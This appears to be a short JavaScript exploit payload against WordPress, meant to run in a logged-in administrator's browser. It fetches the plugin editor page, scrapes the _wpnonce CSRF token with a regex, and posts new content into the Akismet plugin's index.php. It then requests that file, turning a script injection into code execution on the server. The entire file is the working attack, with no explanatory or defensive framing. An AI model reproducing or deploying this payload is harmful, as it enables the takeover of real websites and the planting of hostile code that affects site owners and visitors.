function httpGet(theUrl)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

var page = httpGet("/wp-admin/plugin-editor.php?file=akismet/index.php&plugin=akismet/akismet.php")

function httpPost(theUrl, csrftoken)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "POST", theUrl, false );
    xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=/wp-admin/plugin-editor.php?file=akismet/index.php&plugin=akismet/akismet.php&newcontent=%s&action=update&file=akismet/index.php&plugin=akismet/index.php&scrollto=0&submit=Update+File");
    return xmlHttp.responseText;

}

//ik I fail at regex fuk u
var regExp = /name=\"_wpnonce\"\svalue=\"([^)]+)\"/;
var matches = regExp.exec(page);
var csrftoken = matches[1].slice(0, 10);

httpPost("/wp-admin/plugin-editor.php", csrftoken);
httpGet("/wp-content/plugins/akismet/index.php");
